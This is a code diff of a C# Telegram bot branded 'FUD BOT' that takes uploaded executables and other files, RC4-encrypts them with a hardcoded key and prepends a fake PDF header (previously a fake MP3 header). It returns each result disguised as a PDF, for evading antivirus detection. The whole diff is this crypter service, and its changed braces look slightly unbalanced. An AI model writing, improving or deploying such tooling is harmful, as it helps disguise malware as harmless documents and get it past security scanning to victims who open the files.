@@ -9,7 +9,7 @@ builder.Services.AddHttpClient();
 
 var app = builder.Build();
 
-app.MapGet("/", () => "FUD BOT v3.0 LIVE! PDF/EXE/JSON/XML → MP3");
+app.MapGet("/", () => "FUD BOT v4.0 LIVE! EXE/PDF/JSON/XML → FUD.pdf");
 app.MapGet("/health", () => "OK");
 
 static byte[] RC4(byte[] data, byte[] key) {
@@ -40,19 +40,19 @@ app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory
     if (update.TryGetProperty("message", out var message)) {
         var client = clientFactory.CreateClient();
         
-        // /start command
+        // /start
         if (message.TryGetProperty("text", out var textElem) && textElem.GetString() == "/start") {
             using var form = new MultipartFormDataContent();
             if (message.TryGetProperty("chat", out var chat) && chat.TryGetProperty("id", out var chatId)) {
                 form.Add(new StringContent(chatId.GetInt64().ToString()), "chat_id");
-                form.Add(new StringContent("🚀 **FUD v3.0** Send .exe .pdf .json .xls .xlsx .xml → FUD MP3!\n🔑 FUD2026KEY!"), "text");
+                form.Add(new StringContent("🚀 **FUD v4.0** Send .exe .pdf .json .xls .xlsx .xml → **FUD.pdf**\n🔑 FUD2026KEY!"), "text");
                 form.Add(new StringContent("markdown"), "parse_mode");
             }
             await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", form);
             return;
         }
         
-        // File processing
+        // Files → FUD.pdf
         if (message.TryGetProperty("document", out var docElement)) {
             if (docElement.TryGetProperty("file_id", out var fileId) && 
                 docElement.TryGetProperty("file_name", out var fileNameElem)) {
@@ -61,38 +61,40 @@ app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory
                     filename.EndsWith(".json") || filename.EndsWith(".xls") || 
                     filename.EndsWith(".xlsx") || filename.EndsWith(".xml")) {
                     
-                    // Get file path
-                    using var formData = new MultipartFormDataContent();
-                    formData.Add(new StringContent(fileId.GetString()!), "file_id");
-                    var fileResponse = await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/getFile", formData);
-                    var fileJson = await fileResponse.Content.ReadAsStringAsync();
-                    using var fileDoc = JsonDocument.Parse(fileJson);
-                    var filePath = fileDoc.RootElement.GetProperty("result").GetProperty("file_path").GetString()!;
-                    
-                    // Download file
-                    var fileUrl = $"https://api.telegram.org/file/bot{BOT_TOKEN}/{filePath}";
-                    var fileBytes = await client.GetByteArrayAsync(fileUrl);
-                    
-                    // Encrypt + Stego
-                    var key = Encoding.UTF8.GetBytes("FUD2026KEY!");
-                    var encrypted = RC4(fileBytes, key);
-                    var mp3Header = Encoding.UTF8.GetBytes("ID3\x03\x00\x00\x00\x00\x00\nFUD2026");
-                    var fudMp3 = mp3Header.Concat(encrypted).ToArray();
-                    
-                    // Send FUD MP3
-                    if (message.TryGetProperty("chat", out var chat2) && chat2.TryGetProperty("id", out var chatId2)) {
-                        var chatId = chatId2.GetInt64();
-                        using var mp3Content = new MultipartFormDataContent();
-                        mp3Content.Add(new StringContent(chatId.ToString()), "chat_id");
-                        var mp3Stream = new MemoryStream(fudMp3);
-                        mp3Content.Add(new StreamContent(mp3Stream), "document", "fud.mp3");
-                        mp3Content.Add(new StringContent($"✅ **FUD MP3!**\n🔑 `FUD2026KEY!`\n📁 {filename}"), "caption");
-                        mp3Content.Add(new StringContent("markdown"), "parse_mode");
-                        await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", mp3Content);
-                    }
+                // Get file
+                using var formData = new MultipartFormDataContent();
+                formData.Add(new StringContent(fileId.GetString()!), "file_id");
+                var fileResponse = await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/getFile", formData);
+                var fileJson = await fileResponse.Content.ReadAsStringAsync();
+                using var fileDoc = JsonDocument.Parse(fileJson);
+                var filePath = fileDoc.RootElement.GetProperty("result").GetProperty("file_path").GetString()!;
+                
+                // Download
+                var fileUrl = $"https://api.telegram.org/file/bot{BOT_TOKEN}/{filePath}";
+                var fileBytes = await client.GetByteArrayAsync(fileUrl);
+                
+                // RC4 Encrypt
+                var key = Encoding.UTF8.GetBytes("FUD2026KEY!");
+                var encrypted = RC4(fileBytes, key);
+                
+                // PDF Stego: %PDF header + payload
+                var pdfHeader = Encoding.UTF8.GetBytes("%PDF-1.4\n%FUD2026\n");
+                var fudPdf = pdfHeader.Concat(encrypted).ToArray();
+                
+                // Send FUD.pdf
+                if (message.TryGetProperty("chat", out var chat2) && chat2.TryGetProperty("id", out var chatId2)) {
+                    var chatId = chatId2.GetInt64();
+                    using var pdfContent = new MultipartFormDataContent();
+                    pdfContent.Add(new StringContent(chatId.ToString()), "chat_id");
+                    var pdfStream = new MemoryStream(fudPdf);
+                    pdfContent.Add(new StreamContent(pdfStream), "document", $"fud-{filename}.pdf");
+                    pdfContent.Add(new StringContent($"✅ **FUD.pdf!**\n🔑 `FUD2026KEY!`\n📁 {filename}\n📄 RC4 Stego PDF"), "caption");
+                    pdfContent.Add(new StringContent("markdown"), "parse_mode");
+                    await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", pdfContent);
                 }
             }
         }
+    }
     }
 });
 
